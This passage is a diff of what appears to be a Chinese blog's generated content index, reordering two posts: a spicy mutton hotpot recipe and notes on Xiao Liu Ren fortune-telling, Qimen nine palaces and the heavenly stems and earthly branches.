-<h4 id="小吉"><a href="#小吉" class="headerlink" title="小吉"></a>小吉</h4><p>1、人来喜时<br>2、五行属木<br>3、六合<br>4、数字：1,5,7<br>5、有和合、吉利之意</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小吉最吉昌</span><br><span class="line">路上好商量</span><br><span class="line">阴人来报喜</span><br><span class="line">失物在坤方（西南）</span><br><span class="line">行人即便至</span><br><span class="line">交易甚是强</span><br><span class="line">凡事皆和合</span><br><span class="line">病者祈上苍</span><br></pre></td></tr></table></figure>
-
-<h4 id="空亡"><a href="#空亡" class="headerlink" title="空亡"></a>空亡</h4><p>1、音信稀时<br>2、五行属土<br>3、黄色<br>4、中央<br>5、勾陈<br>6、数字：3,6,9<br>7、有不吉、无果之意</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空亡事不祥</span><br><span class="line">阴人多乖张</span><br><span class="line">求财无利益</span><br><span class="line">行人有灾殃</span><br><span class="line">失物寻一见</span><br><span class="line">官事有刑伤</span><br><span class="line">病人逢暗鬼</span><br><span class="line">祈解保安康</span><br></pre></td></tr></table></figure>
-
-<h2 id="奇门"><a href="#奇门" class="headerlink" title="奇门"></a>奇门</h2><h3 id="九宫五行"><a href="#九宫五行" class="headerlink" title="九宫五行"></a>九宫五行</h3><p>五行生克关系<br><img src="/images/pasted-74.png" alt="upload successful"><br>九宫位置<br><img src="/images/pasted-73.png" alt="upload successful"><br>东南西北位置<br><img src="/images/pasted-75.png" alt="upload successful"></p>
-<h2 id="干支"><a href="#干支" class="headerlink" title="干支"></a>干支</h2><p>甲乙东方木，丙丁南方火，戊己中央土，庚辛西方金，壬癸北方水</p>
-<p>寅卯为木居东方，巳午为火居正南，<br>申酉属金位在西，子亥属水在北边，<br>辰戌丑未皆属土，分别居于四维偏，<br>辰在东南戌西北，丑在东北未西南。</p>
-<h2 id="时辰"><a href="#时辰" class="headerlink" title="时辰"></a>时辰</h2><p>子丑寅卯辰巳午未申酉戌亥</p>
+    <title>羊肉火锅-牛油辣味</title>
+    <url>/2025/02/04/%E7%BE%8A%E8%82%89%E7%81%AB%E9%94%85-%E7%89%9B%E6%B2%B9%E8%BE%A3%E5%91%B3/</url>
+    <content><![CDATA[<h2 id="配料"><a href="#配料" class="headerlink" title="配料"></a>配料</h2><p>配料表中的量不包括焯水等步骤的损耗</p>
+<style>
+table th:nth-of-type(1) {
+width: 20%;
+}
+</style>
+<table>
+<thead>
+<tr>
+<th align="center">名称</th>
+<th align="left">量</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">羊肉</td>
+<td align="left">一到两斤左右</td>
+</tr>
+<tr>
+<td align="center">花椒</td>
+<td align="left">可放可不放</td>
+</tr>
+<tr>
+<td align="center">香叶</td>
+<td align="left">3片左右</td>
+</tr>
+<tr>
+<td align="center">桂皮</td>
+<td align="left">一小块</td>
+</tr>
+<tr>
+<td align="center">八角</td>
+<td align="left">一个</td>
+</tr>
+<tr>
+<td align="center">干辣椒</td>
+<td align="left">若干</td>
+</tr>
+<tr>
+<td align="center">大葱</td>
+<td align="left">三段</td>
+</tr>
+<tr>
+<td align="center">姜</td>
+<td align="left">适量</td>
+</tr>
+<tr>
+<td align="center">大蒜</td>
+<td align="left">适量（半颗左右）</td>
+</tr>
+<tr>
+<td align="center">白萝卜</td>
+<td align="left">随意</td>
+</tr>
+<tr>
+<td align="center">海底捞牛油火锅底料</td>
+<td align="left">小包的半包</td>
+</tr>
+</tbody></table>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>1、一点姜、葱、料酒给羊肉焯水，撇去浮沫后捞出备用</p>
+<p>2、热油炒香姜、大葱、大蒜、和香料，然后倒入火锅底料翻炒均匀，可加入白胡椒，但是感觉没啥区别</p>
+<p>3、加入羊肉翻炒均匀后加水煮90分钟，中途加入萝卜（可高压锅煮45分钟）</p>
 ]]></content>
       <categories>
         <category>生活</category>
-        <category>玄学</category>
+        <category>菜谱</category>
       </categories>
       <tags>
-        <tag>算命知识</tag>
-        <tag>小六壬</tag>
+        <tag>菜谱</tag>
+        <tag>羊肉火锅</tag>
       </tags>
   </entry>
   <entry>
@@ -2739,77 +2890,46 @@ width: 20%;
       </tags>
   </entry>
   <entry>
-    <title>羊肉火锅-牛油辣味</title>
-    <url>/2025/02/04/%E7%BE%8A%E8%82%89%E7%81%AB%E9%94%85-%E7%89%9B%E6%B2%B9%E8%BE%A3%E5%91%B3/</url>
-    <content><![CDATA[<h2 id="配料"><a href="#配料" class="headerlink" title="配料"></a>配料</h2><p>配料表中的量不包括焯水等步骤的损耗</p>
-<style>
-table th:nth-of-type(1) {
-width: 20%;
-}
-</style>
-<table>
-<thead>
-<tr>
-<th align="center">名称</th>
-<th align="left">量</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">羊肉</td>
-<td align="left">一到两斤左右</td>
-</tr>
-<tr>
-<td align="center">花椒</td>
-<td align="left">可放可不放</td>
-</tr>
-<tr>
-<td align="center">香叶</td>
-<td align="left">3片左右</td>
-</tr>
-<tr>
-<td align="center">桂皮</td>
-<td align="left">一小块</td>
-</tr>
-<tr>
-<td align="center">八角</td>
-<td align="left">一个</td>
-</tr>
-<tr>
-<td align="center">干辣椒</td>
-<td align="left">若干</td>
-</tr>
-<tr>
-<td align="center">大葱</td>
-<td align="left">三段</td>
-</tr>
-<tr>
-<td align="center">姜</td>
-<td align="left">适量</td>
-</tr>
-<tr>
-<td align="center">大蒜</td>
-<td align="left">适量（半颗左右）</td>
-</tr>
-<tr>
-<td align="center">白萝卜</td>
-<td align="left">随意</td>
-</tr>
-<tr>
-<td align="center">海底捞牛油火锅底料</td>
-<td align="left">小包的半包</td>
-</tr>
-</tbody></table>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>1、一点姜、葱、料酒给羊肉焯水，撇去浮沫后捞出备用</p>
-<p>2、热油炒香姜、大葱、大蒜、和香料，然后倒入火锅底料翻炒均匀，可加入白胡椒，但是感觉没啥区别</p>
-<p>3、加入羊肉翻炒均匀后加水煮90分钟，中途加入萝卜（可高压锅煮45分钟）</p>
+    <title>算命</title>
+    <url>/2025/02/05/%E7%AE%97%E5%91%BD/</url>
+    <content><![CDATA[<h2 id="六神"><a href="#六神" class="headerlink" title="六神"></a>六神</h2><h3 id="手势位置"><a href="#手势位置" class="headerlink" title="手势位置"></a>手势位置</h3><p>左手三指，分别是大安、流连、速喜、赤口、小吉、空亡<br><img src="/images/pasted-71.png" alt="upload successful"></p>
+<p>速记：大、流、速、赤、小、空。</p>
+<h3 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h3><h4 id="大安"><a href="#大安" class="headerlink" title="大安"></a>大安</h4><p>1、身不动时（如果算一个人在干什么）<br>2、五行：属木<br>3、方位：东<br>4、神煞：青龙<br>5、数字：1、5、7<br>6、安心吉祥的意思</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大安事事昌</span><br><span class="line">求谋在东方</span><br><span class="line">失物去不远</span><br><span class="line">宅家保平安</span><br><span class="line">行人身未动</span><br><span class="line">病者主无妨</span><br><span class="line">将军回田野</span><br><span class="line">仔细更推详</span><br></pre></td></tr></table></figure>
+
+<h4 id="留连"><a href="#留连" class="headerlink" title="留连"></a>留连</h4><p>1、人未归时<br>2、五行属水<br>3、黑色<br>4、方位北<br>5、玄武<br>6、数字：2、8、10<br>7、有暗昧不明、延迟、纠缠、拖延、漫长之意</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">留连事难成</span><br><span class="line">求谋日未明</span><br><span class="line">官事凡宜缓</span><br><span class="line">去者未回程</span><br><span class="line">失物南方见</span><br><span class="line">急讨方心称</span><br><span class="line">更须防口舌</span><br><span class="line">人口且平平</span><br></pre></td></tr></table></figure>
+
+<h4 id="速喜"><a href="#速喜" class="headerlink" title="速喜"></a>速喜</h4><p>1、人即至时<br>2、五行属火<br>3、红色<br>4、方位为南方<br>5、数字：3,6,9<br>6、有快速、吉利、时机已到之意</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">速喜喜来临</span><br><span class="line">求财向南行</span><br><span class="line">失物申未午（南、西南）</span><br><span class="line">逢人路上寻</span><br><span class="line">官事有福德</span><br><span class="line">病者无祸侵</span><br><span class="line">田宅六畜吉</span><br><span class="line">行人有信音</span><br></pre></td></tr></table></figure>
+
+<h4 id="赤口"><a href="#赤口" class="headerlink" title="赤口"></a>赤口</h4><p>1、官事凶时<br>2、五行属金<br>3、白色<br>4、西方<br>5、白虎<br>6、数字：4，7，10<br>7、有不吉、惊恐、凶险、口舌是非之意</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">赤口主口舌</span><br><span class="line">官非切宜防</span><br><span class="line">失物急去寻</span><br><span class="line">行人有惊慌</span><br><span class="line">鸡犬（六畜）多作怪</span><br><span class="line">病者出西方</span><br><span class="line">更须防咀咒</span><br><span class="line">诚恐染瘟皇</span><br></pre></td></tr></table></figure>
+
+<h4 id="小吉"><a href="#小吉" class="headerlink" title="小吉"></a>小吉</h4><p>1、人来喜时<br>2、五行属木<br>3、六合<br>4、数字：1,5,7<br>5、有和合、吉利之意</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小吉最吉昌</span><br><span class="line">路上好商量</span><br><span class="line">阴人来报喜</span><br><span class="line">失物在坤方（西南）</span><br><span class="line">行人即便至</span><br><span class="line">交易甚是强</span><br><span class="line">凡事皆和合</span><br><span class="line">病者祈上苍</span><br></pre></td></tr></table></figure>
+
+<h4 id="空亡"><a href="#空亡" class="headerlink" title="空亡"></a>空亡</h4><p>1、音信稀时<br>2、五行属土<br>3、黄色<br>4、中央<br>5、勾陈<br>6、数字：3,6,9<br>7、有不吉、无果之意</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空亡事不祥</span><br><span class="line">阴人多乖张</span><br><span class="line">求财无利益</span><br><span class="line">行人有灾殃</span><br><span class="line">失物寻一见</span><br><span class="line">官事有刑伤</span><br><span class="line">病人逢暗鬼</span><br><span class="line">祈解保安康</span><br></pre></td></tr></table></figure>
+
+<h2 id="奇门"><a href="#奇门" class="headerlink" title="奇门"></a>奇门</h2><h3 id="九宫五行"><a href="#九宫五行" class="headerlink" title="九宫五行"></a>九宫五行</h3><p>五行生克关系<br><img src="/images/pasted-74.png" alt="upload successful"><br>九宫位置<br><img src="/images/pasted-73.png" alt="upload successful"><br>东南西北位置<br><img src="/images/pasted-75.png" alt="upload successful"></p>
+<h2 id="干支"><a href="#干支" class="headerlink" title="干支"></a>干支</h2><p>甲乙东方木，丙丁南方火，戊己中央土，庚辛西方金，壬癸北方水</p>
+<p>寅卯为木居东方，巳午为火居正南，<br>申酉属金位在西，子亥属水在北边，<br>辰戌丑未皆属土，分别居于四维偏，<br>辰在东南戌西北，丑在东北未西南。</p>
+<h2 id="时辰"><a href="#时辰" class="headerlink" title="时辰"></a>时辰</h2><p>子丑寅卯辰巳午未申酉戌亥</p>
 ]]></content>
       <categories>
         <category>生活</category>
-        <category>菜谱</category>
+        <category>玄学</category>
       </categories>
       <tags>
-        <tag>菜谱</tag>
-        <tag>羊肉火锅</tag>
+        <tag>算命知识</tag>
+        <tag>小六壬</tag>
       </tags>
   </entry>
   <entry>
